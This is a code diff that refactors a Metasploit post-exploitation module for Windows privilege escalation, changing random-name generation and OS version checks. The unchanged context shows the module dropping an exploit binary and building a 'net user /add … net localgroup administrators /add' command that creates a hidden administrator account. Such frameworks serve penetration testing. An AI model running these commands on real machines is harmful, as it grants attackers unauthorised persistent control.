@@ -5,6 +5,7 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::Common
   include Msf::Post::File
+  include Msf::Post::Windows::Version
   #  include Msf::Post::Windows::Priv
 
   def initialize(info = {})
@@ -59,8 +60,8 @@ class MetasploitModule < Msf::Post
   def setup
     super
     validate_active_host
-    @exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha((rand(6..13)))
-    @script_name = datastore['SCRIPT_NAME'] || Rex::Text.rand_text_alpha((rand(6..13)))
+    @exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha(rand(6..13))
+    @script_name = datastore['SCRIPT_NAME'] || Rex::Text.rand_text_alpha(rand(6..13))
     @exploit_name = "#{exploit_name}.exe" unless exploit_name.match(/\.exe$/i)
     @script_name = "#{script_name}.sct" unless script_name.match(/\.sct$/i)
     @temp_path = datastore['PATH'] || session.sys.config.getenv('TEMP')
@@ -69,8 +70,8 @@ class MetasploitModule < Msf::Post
   end
 
   def populate_command
-    username = Rex::Text.rand_text_alpha((rand(6..13)))
-    password = Rex::Text.rand_text_alpha((rand(6..13)))
+    username = Rex::Text.rand_text_alpha(rand(6..13))
+    password = Rex::Text.rand_text_alpha(rand(6..13))
     print_status("username = #{username}, password = #{password}")
     cmd_to_run = 'net user /add ' + username + ' ' + password
     cmd_to_run += '  & net localgroup administrators /add ' + username
@@ -95,8 +96,9 @@ class MetasploitModule < Msf::Post
     if sysinfo['Architecture'] == ARCH_X86
       fail_with(Failure::NoTarget, 'Exploit code is 64-bit only')
     end
-    if sysinfo['OS'] =~ /XP/
-      fail_with(Failure::Unknown, 'The exploit binary does not support Windows XP')
+    version = get_version_info
+    unless version.build_number.between?(Msf::WindowsVersion::Vista_SP0, Msf::WindowsVersion::Win10_1803)
+      fail_with(Failure::Unknown, 'The exploit does not support this OS')
     end
   end
 
